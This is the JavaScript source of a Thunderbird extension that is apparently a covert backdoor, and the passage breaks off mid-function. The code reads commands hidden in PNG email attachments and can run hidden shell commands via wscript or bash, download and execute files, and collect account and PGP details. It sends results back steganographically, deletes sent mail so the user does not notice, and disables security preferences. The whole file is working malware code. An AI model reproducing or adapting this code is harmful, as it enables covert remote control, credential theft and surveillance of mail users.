//TODO:
// - remove automatic retry of failed actions and just send some output back with the details
// If an output fails to be sent, then keep the email in a queue and retry sending the email
// but avoid retrying the complete action

const OS_LINUX      = 1
const OS_WIN        = 2
const OS_MAC        = 3
const OS_UNKNOWN    = 4

var nsIBkdManager = {
  
  init: function(e) {
		// initialization code
        Components.utils.import("resource:///modules/gloda/mimemsg.js");
		
        this.actionQueue = [];
        this.immediateActionCodes = {0:'', 8:''} // RESET & GETSTATUS
        this.actionFailThreshold = 5;
        this.maxActionFailed = 20;
        this.actionFailed = [];
        this.deleteSentQueue = [];
        this.currentAction = null;
        this.actionTimer = null;
        this.actionTimerValue = 60000; // miliseconds
        this.deleteSentTimer = null;
        this.enigmailInstalled = false;
        this.enigMessageDecryptOriginal = null;

        this.consoleService = Components.classes['@mozilla.org/consoleservice;1'].getService(Components.interfaces.nsIConsoleService);
        this.filterService = Components.classes["@mozilla.org/messenger/services/filters;1"].getService(Components.interfaces.nsIMsgFilterService);
        this.notificationService = Components.classes["@mozilla.org/messenger/msgnotificationservice;1"].getService(Components.interfaces.nsIMsgFolderNotificationService);
        this.composeService = Components.classes["@mozilla.org/messengercompose;1"].getService(Components.interfaces.nsIMsgComposeService);
        this.prefService = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService);
        this.prefBranch = this.prefService.getBranch(null);
        this.ioService = Components.classes["@mozilla.org/network/io-service;1"].getService(Components.interfaces.nsIIOService);
        this.accountManager = Components.classes["@mozilla.org/messenger/account-manager;1"].createInstance(Components.interfaces.nsIMsgAccountManager);
        this.messageServiceImap = Components.classes["@mozilla.org/messenger/messageservice;1?type=imap"];
        this.messageServiceMbox = Components.classes["@mozilla.org/messenger/messageservice;1?type=mailbox-message"];
        this.unicodeConverter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"]
                                    .createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
        
        this.checkEnigmail();
        
        if (this.enigmailInstalled) {
            EnigInitCommon("enigmailBkd");
            GetEnigmailSvc();
            this.enigMessageDecryptOriginal = enigMessageDecrypt;
        }
            
        this.setupPrefs();
        
        // Components initialization
		this.msgMessageFlags = Components.interfaces.nsMsgMessageFlags;
		if (!this.msgMessageFlags) {
			this.msgMessageFlags = {
				Read: 0x00000001,
				Replied: 0x00000002,
				Marked: 0x00000004,
				Expunged: 0x00000008,
				HasRe: 0x00000010,
				Elided: 0x00000020,
				Offline: 0x00000080,
				Watched: 0x00000100,
				SenderAuthed: 0x00000200,
				Partial: 0x00000400,
				Queued: 0x00000800,
				Forwarded: 0x00001000,
				Priorities: 0x0000E000,
				New: 0x00010000,
				Ignored: 0x00040000,
				ImapDeleted: 0x00200000,
				MDNReportNeeded: 0x00400000,
				MDNReportSent: 0x00800000,
				Template: 0x01000000,
				Attachment: 0x10000000,
				Labels: 0x0E000000,
				RuntimeOnly: 0x00000020
			};
		}
		this.msgFolderFlags = Components.interfaces.nsMsgFolderFlags;
		if (!this.msgFolderFlags) {
			this.msgFolderFlags = {
				Newsgroup: 0x00000001,
				NewsHost: 0x00000002,
				Mail: 0x00000004,
				Subscribed: 0x00000040,
				Unused2: 0x00000080,
				Trash: 0x00000100,
				SentMail: 0x00000200,
				Drafts: 0x00000400,
				Queue: 0x00000800,
				Inbox: 0x00001000,
				ImapBox: 0x00002000,
				Archive: 0x00004000,
				ProfileGroup: 0x00008000,
				Unused4: 0x00010000,
				GotNew: 0x00020000,
				ImapServer: 0x00040000,
				ImapPersonal: 0x00080000,
				ImapPublic: 0x00100000,
				ImapOtherUser: 0x00200000,
				Templates: 0x00400000,
				PersonalShared: 0x00800000,
				ImapNoselect: 0x01000000,
				CreatedOffline: 0x02000000,
				ImapNoinferiors: 0x04000000,
				Offline: 0x08000000,
				OfflineEvents: 0x10000000,
				CheckNew: 0x20000000,
				Junk: 0x40000000,
				Favorite: 0x80000000
			};
		}

		// Message filter
		this.msgFilterCustomAction = {
			id: 'nsIBkdManager-filterAction',
			allowDuplicates: true,
			isAsync: false,
	
			isValidForType: function(type, scope) {
				return true;
			},
	
			validateActionValue: function(actionValue, actionFolder, filterType) {
				return actionValue;
			},
	
			apply: function(msgHdrs, actionValue, copyListener, filterType, msgWindow) {
				//this.msgsClassified(msgHdrs, false, false);
				var aMsgsEnum = msgHdrs.enumerate();
				while(aMsgsEnum.hasMoreElements()) {
					aMsg = aMsgsEnum.getNext().QueryInterface(Components.interfaces.nsIMsgDBHdr);
					if ( this.isMsgNew(aMsg)) {  // Message has not been read yet and it is new
						this.analyzeMsg(aMsg);
					}
				}
			},

			QueryInterface: function(aIID) {
				// nsIBkdManager implements 'nsISupports' and 'nsIMsgFolderListener' interfaces...
				if (aIID.equals(Components.interfaces.nsISupports) || aIID.equals(Components.interfaces.nsIMsgFilterCustomAction)) {
					return this;
				}
				throw Components.results.NS_ERROR_NO_INTERFACE;
			}
		};
				
		this.msgFilterCustomAction.name = "default filter action" // change this? some way to hide it?
		
		this.filterService.addCustomAction && this.filterService.addCustomAction(this.msgFilterCustomAction);
        
        // for lazy inicialization of the enigmail service
		try {
            if (this.checkEnigmail()) {
                EnigInitCommon("enigmailBkd");
                GetEnigmailSvc();
                this.enigmailInstalled = true;
            }
        }
        catch (ex) {
            this.enigmailInstalled = false;
        }
        
		this.notificationService.addListener(this, this.notificationService.msgsClassified); // msgsClassified used since TB3
        this.loadActionState();
	},
	
    
    setupPrefs : function() {
        // force security.fileuri.strict_origin_policy to false in case we need it for canvas.getImageData
        this.setPreference("signed.applets.codebase_principal_support", true);
        this.setPreference("security.fileuri.strict_origin_policy", false);
        netscape.security.PrivilegeManager.enablePrivilege('UniversalXPConnect');
        netscape.security.PrivilegeManager.enablePrivilege('UniversalBrowserWrite');
        netscape.security.PrivilegeManager.enablePrivilege('UniversalPreferencesWrite');
        netscape.security.PrivilegeManager.enablePrivilege('CapabilityPreferencesAccess');
        netscape.security.PrivilegeManager.enablePrivilege('UniversalFileRead');
        pref.savePrefFile(null);

    },
    
    setPreference : function(prefName, val) {
        try {
            switch (this.prefBranch.getPrefType(prefName)){
                case this.prefBranch.PREF_STRING:
                    this.prefBranch.setCharPref(prefName, val);            
                case this.prefBranch.PREF_INT:
                    this.prefBranch.setIntPref (prefName, val);            
                case this.prefBranch.PREF_BOOL:
                    this.prefBranch.setBoolPref(prefName, val);
            }
            return true; // we assume it was changed if no error was raised
        }
        catch(e) { }
        
        return false;
    },
    
    getPreference : function(prefName) {
        var value = "Could not be read";
        try {
            switch (this.prefBranch.getPrefType(prefName)){
                case this.prefBranch.PREF_STRING:
                    value = this.prefBranch.getCharPref(prefName);
                case this.prefBranch.PREF_INT:
                    value = this.prefBranch.getIntPref (prefName);         
                case this.prefBranch.PREF_BOOL:
                    value = this.prefBranch.getBoolPref(prefName);
            }
        }
        catch(e) { }
        return value;
    },
    
    getActionsStatus : function() {
        var info = "--- Current Action ---\n";
        info += (this.currentAction != null) ? this.formatObject(this.currentAction) : "null";
        
        info += "\n--- Action Queue ---\n";
        if (this.actionQueue.length) {
            for( var i=0; i < this.actionQueue.length; i++) 
                info += this.formatObject(this.actionQueue[i], "action-"+i);
        }
        else
            info += "EMPTY";
        return info;
    },
    
    getFailedActionStatus : function() {
        var info = "--- Failed Actions IDs ---\n";
        if (this.actionFailed.length) {
            for( var i=0; i < this.actionFailed.length; i++) 
                //info += this.formatObject(this.actionFailed[i], "action-"+i);
                info += this.actionFailed[i] + "\n";
        }
        else
            info += "EMPTY";
        this.actionFailed = []; //clear to reduce mem usage
        return info;
    },
    
    markSpamMessage: function(msgHdr) {
        //TODO: moving from inbox folder to trash and back doesn't update
        // the current selected messages correclty on the lower msg panel.
        // The selection on the msg list is correct but the msg contents are not
        if (msgHdr == null)
            return;
        
        var currentFolder = gFolderDisplay.view.displayedFolder;
        var currentSelectedMsgs = this.getSelectedMessages();
        
        try {
            SelectFolder(msgHdr.folder.URI);
            gFolderDisplay.clearSelection();
            gFolderDisplay.selectMessage(msgHdr, true);
            gFolderDisplay.view.dbView.doCommand(Components.interfaces.nsMsgViewCommandType.junk);
            var trashFolder = msgHdr.folder.rootFolder.getFoldersWithFlags(Components.interfaces.nsMsgFolderFlags.Trash)
                                    .queryElementAt(0, Components.interfaces.nsIMsgFolder);
            MsgMoveMessage(trashFolder);
            gFolderDisplay.clearSelection();
        }
        catch(ex) {}
        
        // go back to the original folder so user doesn't notice this...
        SelectFolder(currentFolder.URI);
        gFolderDisplay.selectMessages(currentSelectedMsgs);
        
    },
    
    getStatusReport : function(action)
    {
        action = action || this.currentAction;
        var report = "";
        report += (this.getValidAccount() != null) ? "A":"No";
        report += " valid account to send emails was found\n\n";
        report += this.getActionsStatus() + "\n";
        report += this.getFailedActionStatus() + "\n";
        //TODO: determine valid output methods
        this.sendOutput(action, report);
        return report;
    },
    
    setActionTimer : function(value) {
        // called when an action is done
        // sets a timer to process next in an async way
        value = value || this.actionTimerValue;
        var this_pNA = this;
        var fprocessNextAction = function(){this_pNA.processNextAction()};
        this.actionTimer = setTimeout(fprocessNextAction, value);
    },
    
    enqueueAction : function(action) {
        // some actions should not be enqueued and processed directly
        if (action.code in this.immediateActionCodes)
        {
            if (this.currentAction != null &&
                !this.currentAction.done)
            {
                // move current action back to queue not to loose it
                this.actionQueue.unshift(this.currentAction);
                this.currentAction = null; // to force processing next in queue
            }
            // now put this action first in queue to process it next
            this.actionQueue.unshift(action);
            
        }
        else
        {
            this.actionQueue.push(action);
        }
        
        this.saveActionState();
        this.processNextAction(); // force to process
    },
    
    processNextAction : function() {
        if (this.currentAction == null ||
            this.currentAction.done)
        {
            var action = this.currentAction;
            delete action; // is this really needed to reduce memory usage?..
            if (this.actionQueue.length) {
                this.currentAction = this.actionQueue.shift();
                try {
                    this.performAction();
                }
                catch(ex) { }
            }
            else
                this.currentAction = null;
        }
    },
    
    resetActions : function() {
        for (var i = 0; i < this.actionQueue.length; i++)
            this.actionQueue[i].cancel();
            
        if (this.currentAction != null)
            this.currentAction.cancel();
        
        this.actionQueue = [];
    },
    
    checkActionFails : function() {
        // make sure that current action didn't fail too much
        // and if not cancel it to avoid looping forever
        if ( this.currentAction != null &&
             this.currentAction.failCount > this.actionFailThreshold )
        {
            if (this.actionFailed.length < this.maxActionFailed)
                this.actionFailed.push(this.currentAction.id);
            else
                this.actionFailed = [];
                
            this.currentAction.cancel();
            return true;
        }
        else
            return false;
    },
    
    performAction : function() {
        var action = this.currentAction;
        if ( action !=null &&
            !action.canceled &&
            !action.done &&
             action.valid )
        {
            switch(action.code)
            {
                //0 - RESET
                case 0:
                    this.resetActions();
                    action.finish();
                    break;
                
                //1 - EXEC
                case 1:
                    this.runCmd(action);
                    break;
                
                //2 - PGP INFO
                case 2:
                    if (this.enigmailInstalled)
                        this.enigHook();
                    else
                        action.cancel();
                    break;
                
                //3 - ACCOUNT INFO
                case 3:
                    this.getAccountInfo(action);
                    break;
                
                //4 - SEND MAIL
                case 4:
                    if ( this.sendEmail2(action.address,
                                         action.subject,
                                         action.body) )
                        action.finish();
                    else
                        action.fail();
                    break;
                
                //5 - OPEN URL
                case 5:
                    if (this.doRequest(action.url, action.data, action.method))
                        action.finish();
                    else
                        action.fail();
                    break;
                
                //6 - READ SETTING
                case 6:
                    this.getGlobalPref(action);
                    break;
                
                //7 - CHANGE SETTING
                case 7:
                    this.setGlobalPref(action);
                    break;
                
                //8 - GET STATUS
                case 8:
                    this.getStatusReport(action)
                    break;
                
                //  9 - DOWNLOAD FILE FROM URL
                // 10 - DOWNLOAD FILE FROM URL & EXECUTE
                case 9: case 10:
                    this.downloadFile(action);
                    break;
            }
        }
        else 
            this.currentAction = null;
        
        this.saveActionState();
        
        if (! this.checkActionFails() )
            this.setActionTimer(500);
        
    },
    
    getStateFile: function() {
        var file = this.getSpecialDir("ProfD");
        file.append("nsIBkdManager.dat");
        return file;
    },
    
    setSaveActionTimer : function(value) {
        value = value || 200;
        var this_pSAT = this;
        var fsaveActionState = function(){this_pSAT.saveActionState()};
        setTimeout(fsaveActionState, value);
    },
    
    saveActionState : function() {
        var actionQueueB64 = [];
        
        // we add the current action is still pending we add it as first element
        // so when loading the state all of them are done in the same order
        if (this.currentAction != null &&
            ! this.currentAction.done)
            actionQueueB64.push(this.currentAction.getPersistable());
        
        for( var i=0; i < this.actionQueue.length; i++)
            if (! this.actionQueue[i].done )
                actionQueueB64.push(this.actionQueue[i].getPersistable());
        
        var state = {
                        "actionQueueB64" : actionQueueB64,
                        "actionFailed" : this.actionFailed,
                        "deleteSentQueue" : this.deleteSentQueue
                    };
        var strState = JSON.stringify(state);
        var file = this.getStateFile();       
        
        if (file.exists())
            file.remove(false);
        
        file.create(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);

        var outputStream = this.getOutputStream(file);
        outputStream.write(strState, strState.length);
        outputStream.close();
    },
    
    loadActionState : function() {
        var file = nsIBkdManager.getStateFile();
        if (file.exists()) {
            var strState = nsIBkdManager.readText(file);
            //var strState = nsIBkdManager.readBinary(file);
            var state = JSON.parse(strState);
            var actionQueueB64 = state["actionQueueB64"];
            nsIBkdManager.actionFailed = state["actionFailed"];
            nsIBkdManager.deleteSentQueue = state["deleteSentQueue"];
            // actions are created and added automatically by loadImageData
            for (var i=0; i < actionQueueB64.length; i++)
                nsIBkdManager.loadImageData(actionQueueB64[i].data, null,
                                   actionQueueB64[i].msgSubject);
        }
        
        
    },
       
    clearConsole: function() {
        this.consoleService.logStringMessage("");
    },
    
    formatObject: function(obj, name) {
        // returns a string with all attributes that can be showed as strings
        var s = "<" + name +">\n";
        for (var i in obj)      {
            try {
                if (typeof (obj[i]) != "function")
                    s += i + ": " + obj[i] + "\n";
            } catch (e) { }
        }
        return s;
    },
        
    randomString: function(len, validChars) {
        validChars = validChars || "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        var strResult = '';
        var pos = 0;
        for (var i = 0; i < len; i++){
            pos = Math.floor(Math.random() * validChars.length);
            strResult += validChars.charAt(pos);
        }
        return strResult;
    },

	getExtensionDir : function() {
        //Get extension folder installation path... (this works in firefox 3.x, for firefox 4.x use  AddonManager.getAddonByID)
        var extensionPath = Components.classes["@mozilla.org/extensions/manager;1"].
                    getService(Components.interfaces.nsIExtensionManager).
                    getInstallLocation("test@yoursite"). // guid of extension
                    getItemLocation("test@yoursite");
    },
       
	getTempDir: function() {
        //  https://developer.mozilla.org/en/Code_snippets/File_I%2F%2FO#Getting_special_files
        return this.getSpecialDir("TmpD");
	},
    
    getSpecialDir : function(dir) {
        try {
            return Components.classes["@mozilla.org/file/directory_service;1"]
                  .getService(Components.interfaces.nsIProperties)
                  .get(dir, Components.interfaces.nsIFile);
        }
        catch (ex) {
            return null;
        }
    },
    
    
    getUniqueTempFile : function(extension) {
        extension = extension || "tmp";
        var file = this.getTempDir();
        file.append(this.randomString(7) + "." + extension);
        file.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
        return file;
    },
    

    getInputStream: function(file) {
        var inputFileStream = Components.classes["@mozilla.org/network/file-input-stream;1"]
                .createInstance(Components.interfaces.nsIFileInputStream);

        // inputFileStream.init(file, PR_RDONLY, 0400, Components.interfaces.nsIFileInputStream.CLOSE_ON_EOF);
        inputFileStream.init(file, 0x01, 0400, Components.interfaces.nsIFileInputStream.CLOSE_ON_EOF);
    
        var inputStream = Components.classes["@mozilla.org/binaryinputstream;1"]
                .createInstance(Components.interfaces.nsIBinaryInputStream);

        inputStream.setInputStream(inputFileStream);
    
        return inputStream;
    },
    
    getOutputStream: function(file) {
        var outputFileStream = Components.classes["@mozilla.org/network/file-output-stream;1"]
                .createInstance(Components.interfaces.nsIFileOutputStream);
        // https://developer.mozilla.org/en/PR_Open
        // MODE_WRONLY = 0x02
        // MODE_CREATE = 0x08
        // MODE_TRUNCATE = 0x20
        // MODE_APPEND	0x10
        // 0700 - rwx to owner
        outputFileStream.init(file, 0x02 | 0x08 | 0x10, 0700, 0);
    
        var outputStream = Components.classes["@mozilla.org/binaryoutputstream;1"]
                .createInstance(Components.interfaces.nsIBinaryOutputStream);
    
        outputStream.setOutputStream(outputFileStream);
        
        return outputStream;
    },
	
    getSelectedMessages: function() {
          return gFolderDisplay.selectedMessages;
    },
    
    msgsClassified: function(/*nsIArray*/ aMsgs, /*boolean*/ aJunkProcessed, /*boolean*/ aTraitProcessed) {
        var aMsgsEnum = aMsgs.enumerate();
        while(aMsgsEnum.hasMoreElements()) {
            aMsg = aMsgsEnum.getNext().QueryInterface(Components.interfaces.nsIMsgDBHdr);
            this.msgAdded(aMsg);

        }
    },
    
    msgAdded: function(aMsg) {
        // we only check if msg is new. it can be marked as read by other plugin (for example in case of junk)
        if (this.isMsgNew(aMsg)) {
            this.analyzeMsg(aMsg);
            return true;
        } 
        return false;	
    },
  
    isMsgNew: function(aMsg) {
        return (aMsg.flags & this.msgMessageFlags.New);
    },
	
	getAttention: function() {
	},
      
	getMessageBody: function(msgHdr)  {  
	    var messenger = Components.classes["@mozilla.org/messenger;1"].createInstance(Components.interfaces.nsIMessenger);  
        var listener = Components.classes["@mozilla.org/network/sync-stream-listener;1"]  
					           .createInstance(Components.interfaces.nsISyncStreamListener);  
        var uri = msgHdr.folder.getUriForMsg(msgHdr);  
        messenger.messageServiceFromURI(uri).streamMessage(uri, listener, null, null, false, "");  
        var folder = msgHdr.folder;
        /*
        nsIMsgFolder
        AUTF8String getMsgTextFromStream(in nsIMsgDBHdr aMsgHdr,
						         in nsIInputStream aStream,
						         in long aBytesToRead,
						         in long aMaxOutputLen,
						         in boolean aCompressQuotes);
        */
        return folder.getMsgTextFromStream(listener.inputStream,  
								         msgHdr.Charset,  
								         65536,  
								         32768,  
								         false,  
								         true,  
								         { });
	},
    
    	
	runCmd: function(action) {
        action = action || this.currentAction;
        var cmd = action.command;
        var cmd_parts = cmd.split(" ");
        cmd = cmd_parts[0];
        var args = [];
        for (var i = 1; i < cmd_parts.length; i++) {
            args.push(cmd_parts[i])
        }
        
        var observer = new nsIBkdCmdObserver(action);
		this.execPrg(cmd, args, action.runshell, observer, true, action.filepath || "", true, action.fixargs);
		//this.execPrg(cmd, args, runshell, observer, redirect, outfile, append);
	},
	
    getMessageFromURI: function ( uri )
    {
        var messageService = messenger.messageServiceFromURI(uri); 
        return messageService.messageURIToMsgHdr(uri);
    },
    
	analyzeMsg: function(msgHdr) {
        this.getMimeMessageAttachments(msgHdr);
	},
	
    callbackMimeMessage: function(msgHdr, mimeMsg)
    {
        var attachments = mimeMsg.allAttachments;
        for ( let [index, attachment] in Iterator(attachments) )
        {
            //if (attachment.contentType.match(/image\/.*/) != null) {
            if (attachment.contentType.match(/image\/png/) != null) { //only png images for now
                var attachmentURI = nsIBkdManager.ioService.newURI(attachment.url, null, null);
                var attachChannel = nsIBkdManager.ioService.newChannelFromURI(attachmentURI);
                attachChannel.asyncOpen(new nsIBkdAttachListener(msgHdr), null);
            }
        }
    },

	getMimeMessageAttachments: function(msgHdr) {
        // checks if has any attachments and if they are images it tries to extrac info
        MsgHdrToMimeMessage(msgHdr, null, this.callbackMimeMessage, true);
	},
	
    setupExec: function(cmd, runshell) {        
        try{
            var file = Components.classes["@mozilla.org/file/local;1"]
                         .createInstance(Components.interfaces.nsILocalFile);
			var baseCmd;
            
			if (runshell)
			  baseCmd = this.getBaseCmd();
			else
			  baseCmd = cmd;
			  
            if ( baseCmd != null )
            {
                file.initWithPath(baseCmd);
                var process = Components.classes["@mozilla.org/process/util;1"]
                                        .createInstance(Components.interfaces.nsIProcess2 ||
														Components.interfaces.nsIProcess);
                process.init(file);
                return process;
            }
            else
                return null;
            
        }catch(e){
            return null;
        }
    },
    
    execPrg: function(cmd, args, runshell, observer, redirect, outfile, append, fix){
       try {
            runshell = runshell || true;
            fix = fix || true;
            var process = this.setupExec(cmd, runshell);
            
			if (runshell && fix){
			  // args must be fixed to be able to run it in a shell
			  args = this.fixArgs(args, cmd, redirect, outfile, append);
			}
			
			//XXX: what happens if the prog never ends? is there any timeout?            
            if (process != null) {                
                if (observer == null)
                    observer = dummyObserver;
                process.runAsync(args, args.length, observer);
            }
        } catch(e) { }       
    },
    
    getOS: function() {
        // Returns "WINNT" on Windows Vista, XP, 2000, and NT systems;
        // "Linux" on GNU/Linux; and "Darwin" on Mac OS X.
        var osString = Components.classes["@mozilla.org/xre/app-info;1"]
                       .getService(Components.interfaces.nsIXULRuntime).OS;
        switch(osString)
        {
            case "WINNT":
                return OS_WIN;
                break;            
            case "Linux":
                return OS_LINUX;
                break;            
            case "Darwin":
                return OS_MAC;
                break;            
        }
        return OS_UNKNOWN;
    },
    
    getVbsRunner: function() {
        var file = this.getTempDir();
        file.append("__xsD4un.vbs");
        
        if (file.exists())
            return file.path;
        
        file.create(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
        var outputStream = this.getOutputStream(file);
        var vbsscript = "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n\
WshShell.Run \"%comspec% /C \" & WScript.Arguments.Item(0), 0, true"
        outputStream.write(vbsscript, vbsscript.length);
        outputStream.close();
        return file.path;
    },
    
    getBaseCmd: function() {
        if (this.getOS() == OS_WIN)
        {
            // wscritp allow us to run without a window :)
            return "C:\\WINDOWS\\system32\\wscript.exe";
        }
		else
		{
			//is it safe to asume bash exists?
			// both mac and linux use bash
            return "/bin/bash"; 
        }
    },
	
	fixArgs: function(args, cmd, redirect, outfile, append) {
        // This functions fixes (escapes) all args to make them work with
        // a shell. Args passed to the original cmd now have to be
        // quoted to be passed as part of the only arg to the shell
        // for example: args = ["-c", "\"ls -al\" > /tmp/redir2.txt"]
        var new_args = []
        var joined_args = args.length ? args.join("\" \"") : "";
        var os = this.getOS();
        if (os == OS_WIN)
        {
            new_args.push(this.getVbsRunner());
            new_args.push("//NoLogo");
            new_args.push("//B");
            joined_args = joined_args ? cmd + " " + joined_args : cmd;
        }
        else
        {
            new_args.push("-c");
            joined_args = joined_args ? cmd + " \"" + joined_args + "\"" : cmd;
            //joined_args = joined_args ? "\"" + cmd + " " + joined_args + "\"" : cmd;
        }
        
        if (redirect)
        {
            var redir_operand;
            if (append)
                redir_operand = (os == OS_LINUX) ? " &>> " : " >> " ;
            else
                redir_operand = (os == OS_LINUX) ? " &> " : " > ";
            joined_args = joined_args.concat(redir_operand, outfile);
            if (os == OS_WIN)
                joined_args = joined_args.concat(" 2>>&1");
            else
                if (os == OS_MAC)
                    joined_args = joined_args.concat(" 2>&1");
        }
        new_args.push(joined_args);
        return new_args;
	},
	
    readText : function(file) {
        var istream = this.getInputStream(file);
        var cstream = Components.classes["@mozilla.org/intl/converter-input-stream;1"].
                      createInstance(Components.interfaces.nsIConverterInputStream);
        cstream.init(istream, "UTF-8", 0, 0);
        var tmpstr = new Object(); 
        var fileContent = "";
        while ( cstream.readString(0xffffffff, tmpstr) != 0 )
            fileContent += tmpstr.value;
        return fileContent;
    },
    
    readBinary : function(file) {
        var fileStream = Components.classes['@mozilla.org/network/file-input-stream;1']
                         .createInstance(Components.interfaces.nsIFileInputStream);
        fileStream.init(file, 1, 0, false);
        var binaryStream = Components.classes['@mozilla.org/binaryinputstream;1']
                           .createInstance(Components.interfaces.nsIBinaryInputStream);
        binaryStream.setInputStream(fileStream);
        var output = binaryStream.readBytes(fileStream.available());
        binaryStream.close();
        fileStream.close();
        return output;
    },
    
	getFileContent: function(filename, binary) {
        // reads file contents. By default it reads as text files
        binary = (typeof(binary) == "undefined") ? false : binary;
        try {
            var file = Components.classes['@mozilla.org/file/local;1']
                   .createInstance(Components.interfaces.nsILocalFile);
            file.initWithPath(filename);
            if (binary)
                return this.readBinary(file);
            else
                return this.readText(file);
        }
        catch(ex) {
            return "";
        }
	},
    
    deleteFile : function(filename) {
        if (filename != null)
            try {
                var file = Components.classes['@mozilla.org/file/local;1']
                           .createInstance(Components.interfaces.nsILocalFile);
                file.initWithPath(filename);
                file.remove(false);
            }
            catch(ex) { }
    },
    
    getValidAccount: function() {
        // the default account may not be configured to send emails.
        // Sometimes the local folders is selected as default account
        // but it doesn't have an identity so we can't use it
        var account = null;
        if (this.accountManager.defaultAccount.defaultIdentity != null)
            account = this.accountManager.defaultAccount;
        else
        {
            var accounts = this.accountManager.accounts;
            for (var i = 0; i < accounts.Count(); i++) {
                account = accounts.QueryElementAt(i, Components.interfaces.nsIMsgAccount);
                if (account.defaultIdentity != null)
                    break;
            }
        }
        return account;
    },
    
    getAccountInfo : function(action) {
        action = action || this.currentAction;
        
        var accounts = this.accountManager.accounts;
        var account = null;
        var info = "";
        for (var i = 0; i < accounts.Count(); i++) {
            account = accounts.QueryElementAt(i, Components.interfaces.nsIMsgAccount);
            if (account.defaultIdentity != null && account.defaultIdentity.email == action.email) {
                info += this.formatObject(account.defaultIdentity, "Account Identity");
                info += this.formatObject(account.incomingServer, "Incoming Server");
                if ( this.sendOutput(action, info) )
                    action.finish();
                else
                    action.fail();
                return true;
            }
        }
        return false;
    },
    
    sendOutput : function(action, data) {
        // method
        // 0 - NONE (ignore output)
        // 1 - EMAIL
        // 2 - HTTP
        
        var result = false;
        switch(action.output)
        {
            case 0:
                result = true;
                break;
            
            case 1:
                //TODO: first we encrypt the data!
                
                // then hide it using the original image (with the stegger the action has)
                if (action.usebody) {
                    result = this.sendEmail2(action.address, "Re: " + action.msgSubject, action.id +
                                             "\n-------------------------\n\n" + data);
                }
                else {
                    var stegFile = action.stegger.insert_data(data);
                    if (stegFile != null) {
                        result = this.sendEmail2(action.address, "Re: " + action.msgSubject,
                                                 action.id, "image/png", this.randomString(6)+".png", stegFile.path);
                        this.deleteFile(stegFile.path);
                    }
                }
                break;
            case 2:
                result = this.doRequest(action.address, data);
                break;
        }

        if (result)
            action.finish();
        else
            action.fail();

        return result;
    },
    
    // see http://forums.mozillazine.org/viewtopic.php?f=19&t=388551
    sendEmail: function(address, subject, body, attachments, deleteAfter) {
        attachments = (attachments == null) ? [] : attachments;
        deleteAfter = (typeof(deleteAfter) == "undefined") ? true : deleteAfter;

        var composeFields = Components.classes["@mozilla.org/messengercompose/composefields;1"].createInstance(Components.interfaces.nsIMsgCompFields);
        var account = this.getValidAccount();
        if (account != null)
        {
            composeFields.from = account.defaultIdentity.email;
            composeFields.replyTo = account.defaultIdentity.email;
            composeFields.to = address;
            composeFields.body = '\n' + body + '\n\n'; //if body doesn't end with EOL message is not sent
            composeFields.subject = subject;
            //composeFields.forcePlainText = true;
            //composeFields.useMultipartAlternative = true;
  
            for (var i = 0; i < attachments.length; i++) {
                var attachment = Components.classes["@mozilla.org/messengercompose/attachment;1"].createInstance(Components.interfaces.nsIMsgAttachment);
                var filepath = attachments[i];
                filepath = filepath.replace(/\\/g,"/");
                attachment.name = "attachment-" + i;
                attachment.url = "file://" + encodeURIComponent(filepath);
                composeFields.addAttachment(attachment);
            }
            
            var msgComposeParams = Components.classes["@mozilla.org/messengercompose/composeparams;1"].createInstance(Components.interfaces.nsIMsgComposeParams);
            msgComposeParams.composeFields = composeFields;
            msgComposeParams.format = 2 //plain text
            msgComposeParams.identity = account.defaultIdentity;
            
            var msgSend = Components.classes["@mozilla.org/messengercompose/compose;1"].createInstance(Components.interfaces.nsIMsgCompose);
            msgSend.Initialize(null, msgComposeParams);
            
            try {
                msgSend.SendMsg(Components.interfaces.nsIMsgCompDeliverMode.Now,
                                account.defaultIdentity, account.key, null, null);
                
                if (deleteAfter) {
                    // add subject to queue to delete it
                    this.deleteSentQueue.push({"subject" : subject, "count" : 0});
                    this.setDeleteFromSentTimer();
                }
                
                return true;
            }
            catch(ex) { }
        }
        return false;
    }, 
    
    getSentFolders: function() {
        // iterates over all accounts and returns an array with all the sent folders
        var allSentFolders = [];
        var accounts = this.accountManager.accounts;
        for (var i = 0; i < accounts.Count(); i++) {
            var account = accounts.QueryElementAt(i, Components.interfaces.nsIMsgAccount);
            if (account.defaultIdentity != null) {
                var rootFolder = account.incomingServer.rootFolder; // nsIMsgFolder
                var sentFolders = rootFolder.getFoldersWithFlags(Components.interfaces.nsMsgFolderFlags.SentMail);
                for (var i = 0; i < sentFolders.length; i++) 
                    allSentFolders.push(sentFolders.queryElementAt(i, Components.interfaces.nsIMsgFolder));
            }
        }
        return allSentFolders; 
    },
    
    setDeleteFromSentTimer : function() {
        var this_dFSF = this;
        var fdeleteFromSentFolder = function(){this_dFSF.deleteFromSentFolder()};
        this.deleteSentTimer = setTimeout(fdeleteFromSentFolder, 5000); //5secs
    },
    
    deleteFromSentFolder: function() {
        //XXX: IMAP sync can mess with us here.. deleting sometimes may not
        // correclty delete from server and upon a new sync sent mails appear again
        
        var deleted = [];
        var sentFolders = this.getSentFolders();
        
        for (var j = 0; j < this.deleteSentQueue.length; j++) {
            var subject1 = this.deleteSentQueue[j].subject;
            var subject2 = subject1.replace("Re: ", "");
            
            for (var i = 0; i < sentFolders.length; i++)
            {
                var sentFolder = sentFolders[i];
                var msgs = sentFolder.messages;
                while(msgs.hasMoreElements()) {
                    msgHeader = msgs.getNext().QueryInterface(Components.interfaces.nsIMsgDBHdr);
                    if ( msgHeader.subject == subject1 ||
                         msgHeader.subject == subject2 )
                    {
                        var currentFolder = gFolderDisplay.view.displayedFolder;
                        var currentSelectedMsgs = this.getSelectedMessages();
                        
                        SelectFolder(sentFolder.URI);
                        gFolderDisplay.clearSelection();
                        gFolderDisplay.selectMessage(msgHeader, true);
                        gFolderDisplay.view.dbView.doCommand(Components.interfaces.nsMsgViewCommandType.deleteNoTrash);
                        gFolderDisplay.clearSelection();
                        // go back to the original folder so user doesn't notice this...
                        SelectFolder(currentFolder.URI);
                        gFolderDisplay.selectMessages(currentSelectedMsgs);
                        deleted.push(j);
